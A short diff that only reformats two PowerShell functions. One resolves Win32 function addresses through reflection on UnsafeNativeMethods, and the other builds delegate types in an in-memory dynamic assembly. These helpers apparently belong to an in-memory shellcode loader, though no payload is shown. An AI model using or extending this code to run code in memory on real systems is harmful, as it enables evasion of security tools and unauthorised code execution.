@@ -1,17 +1,12 @@
 function LookupFunc {
     param($modulename,$functionName)
-    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
-        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')
-    }).GetType('Microsoft.Win32.UnsafeNativeMethods');
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods');
     $moduleobj = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($assem.GetMethod('GetModuleHandle').Invoke(0, @($modulename))));
     return $assem.GetMethod('GetProcAddress', [reflection.bindingflags] 'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef]$moduleobj, $functionName))
 }
-
 function getDelegateType {
  Param (
- [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
- [Parameter(Position = 1)] [Type] $delType = [Void]
- )
+ [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
  $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
  $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,$func).SetImplementationFlags('Runtime, Managed')
